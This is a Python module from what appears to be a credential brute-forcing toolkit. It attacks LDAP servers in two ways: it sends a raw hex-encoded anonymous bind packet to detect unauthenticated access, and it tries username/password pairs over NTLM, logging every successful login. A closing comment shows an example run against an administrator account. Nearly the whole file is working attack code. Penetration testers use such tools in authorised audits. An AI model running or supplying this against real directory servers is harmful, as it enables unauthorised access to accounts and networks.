#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-09-25 21:11:15
@LastEditTime : 2020-02-16 18:37:19
'''

import socket
import binascii
from ldap3 import Server
from ldap3 import Connection
from ldap3 import ALL
from concurrent.futures import ThreadPoolExecutor

try:
    from libs.brute import BruteBaseClass
except ModuleNotFoundError:
    from Rsbrute.libs.brute import BruteBaseClass

class LdapBruteForce(BruteBaseClass):
    """LdapBruteForce"""

    def check_unauth(self,host,port):
        if self.flag:
            socket.setdefaulttimeout(self.timeout)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                data = binascii.a2b_hex("301502010160100201030409416e6f6e796d6f75738000".encode())
                s.send(data)
                result = s.recv(1024)
            except Exception as e:
                hook_msg((False,host,port, "Anonymous", ""))
                # print(str(e))
            else:
                if "invalid" in str(result):
                    hook_msg((True,host,port,"Anonymous",""))
                    self.unauth_result.append(host)
            finally:
                s.close()

    def worker(self,hpup):
        if self.flag:
            host,port,user,pwd = hpup
            try:
                # 123.123.123.123 389 domain\\user password
                s = Server(host=host, port=port, use_ssl=False, get_info='ALL')
                c = Connection(s, user=user, password=pwd, authentication="NTLM")
                c.bind()
                whoami = c.extend.standard.who_am_i()
            except Exception as e:
                hook_msg((False,host,port,user,pwd))
            else:
                if whoami:
                    hook_msg((True,host,port,user,pwd))
            finally:
                s.close()


#python3 main.py -s ldap -i 10.11.11.18 -l 'reber\\administrator' -p Aa123456. -P 389
bruter = LdapBruteForce

